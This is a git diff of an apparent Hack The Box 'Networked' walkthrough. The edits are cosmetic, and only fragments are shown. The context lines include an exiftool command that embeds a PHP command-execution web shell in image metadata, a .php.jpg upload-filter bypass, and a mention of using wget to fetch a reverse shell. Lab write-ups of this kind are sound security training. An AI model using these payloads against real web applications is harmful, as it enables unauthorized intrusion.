@@ -12,15 +12,6 @@ creator: <a href="https://www.hackthebox.eu/home/users/profile/8292">guly</a>
 cleared: 1 Nov 2019
 ---
 
-
-{:refdef: style="text-align: center;"}
-![Logo](/assets/img/walkthroughs/networked_logo.png)
-{: refdef}
-
-
-<p align="center"><font size="3"><b>By:</b></font> <a href="https://www.hackthebox.eu/home/users/profile/182543">Hilbert</a> </p>
-
-
 <h2 align="center">Enumeration</h2>
 Starting with standard nmap scan...
 
@@ -104,7 +95,7 @@ exiftool -DocumentName="<?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = 
 
 then we rename the image file to hilbert.php.jpg and upload it and navigate to the image and check if we have code execution
 
-![RCE](/assets/img/walkthroughs/networked_exifdata_toRCE.png)
+![RCE](/assets/img/walkthroughs/networked_exifdata_torce.png)
 
 Bingo! We can now use wget to download a shell file to the server and then navigate to it to get a reverse shell.
 
@@ -241,5 +232,3 @@ root
 ```
 
 We now have access to the root flag.
-
-If you found this walkthrough helpful, please consider adding a respect to my <a href="https://www.hackthebox.eu/home/users/profile/182543">profile</a>, thanks
